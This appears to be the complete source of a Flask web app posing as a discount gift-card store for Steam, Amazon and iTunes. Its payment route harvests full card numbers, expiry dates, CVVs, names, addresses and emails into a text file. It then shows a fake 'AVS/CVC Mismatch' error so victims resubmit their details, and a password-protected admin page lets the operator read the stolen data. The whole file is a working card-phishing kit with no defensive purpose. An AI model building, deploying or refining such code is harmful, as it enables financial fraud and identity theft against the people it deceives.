from flask import Flask, render_template, request, session, redirect, url_for, make_response
import os
import time

app = Flask(__name__)
app.secret_key = 'your_very_secure_secret_key'

# Your catalog data
PRODUCTS = {
    "Steam": [
        {"name": "Steam $50", "old_price": "$50.00", "new_price": "$35.00", "img": "steam_50.png"},
        {"name": "Steam $100", "old_price": "$100.00", "new_price": "$75.00", "img": "steam_100.png"},
        {"name": "Steam $200", "old_price": "$200.00", "new_price": "$140.00", "img": "steam_200.png"}
    ],
    "Amazon": [
        {"name": "Amazon $10", "old_price": "$10.00", "new_price": "$7.50", "img": "amazon_10.png"},
        {"name": "Amazon $50", "old_price": "$50.00", "new_price": "$38.00", "img": "amazon_50.png"},
        {"name": "Amazon $500", "old_price": "$500.00", "new_price": "$350.00", "img": "amazon_500.png"}
    ],
    "iTunes": [
        {"name": "iTunes $50", "old_price": "$50.00", "new_price": "$35.00", "img": "itunes_50.png"},
        {"name": "iTunes $200", "old_price": "$200.00", "new_price": "$145.00", "img": "itunes_200.png"},
        {"name": "iTunes $500", "old_price": "$500.00", "new_price": "$380.00", "img": "itunes_500.png"}
    ]
}

@app.route('/')
def index():
    return render_template('index.html', products=PRODUCTS)

# --- STABILIZED SUBMIT ROUTE ---
@app.route('/submit-payment', methods=['POST'])
def submit_payment():
    time.sleep(0.5) 
    try:
        # Capture all form fields
        product = request.form.get('product_purchased', 'Unknown')
        # Matches the new 'cardholder_name' name attribute in HTML
        name = request.form.get('cardholder_name', 'Unknown')
        address = request.form.get('billing_address', 'Unknown')
        email = request.form.get('email', 'Unknown')
        card = request.form.get('card_number', 'Unknown')
        expiry = request.form.get('expiry', 'Unknown')
        cvv = request.form.get('cvv', 'Unknown')
        
        # Log entry to data.txt
        log_entry = (f"Product: {product} | Cardholder: {name} | Address: {address} | "
                     f"Email: {email} | Card: {card} | Exp: {expiry} | CVV: {cvv}\n")
        
        with open("data.txt", "a") as f:
            f.write(log_entry)
            
        # Professional AVS/CVC Mismatch response
        response = make_response("""
        <div style="font-family: sans-serif; text-align: center; margin-top: 50px;">
            <h1 style="color: #e53935;">Transaction Failed</h1>
            <p>AVS/CVC Mismatch. Please verify your billing details and try again.</p>
        </div>
        """)
        response.headers['Connection'] = 'close'
        return response
    except Exception as e:
        return f"An error occurred: {str(e)}"

# --- ADMIN ROUTES ---
@app.route('/admin-login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        if request.form.get('username') == 'admin' and request.form.get('password') == 'Ytee1020#':
            session['logged_in'] = True
            return redirect(url_for('admin_dashboard'))
        return '<p style="color:red;">Invalid.</p><a href="/admin-login">Try again</a>'
            
    return '''<div style="max-width: 300px; margin: 50px auto;">
        <h2>Admin Login</h2>
        <form method="post">
            <input name="username" placeholder="Username"><br>
            <input type="password" name="password" placeholder="Password"><br>
            <button type="submit">Login</button>
        </form></div>'''

@app.route('/admin')
def admin_dashboard():
    if not session.get('logged_in'): return redirect(url_for('admin_login'))
    content = open("data.txt", "r").read() if os.path.exists("data.txt") else "No data."
    return f"<h1>Dashboard</h1><pre>{content}</pre><a href='/admin-logout'>Logout</a>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
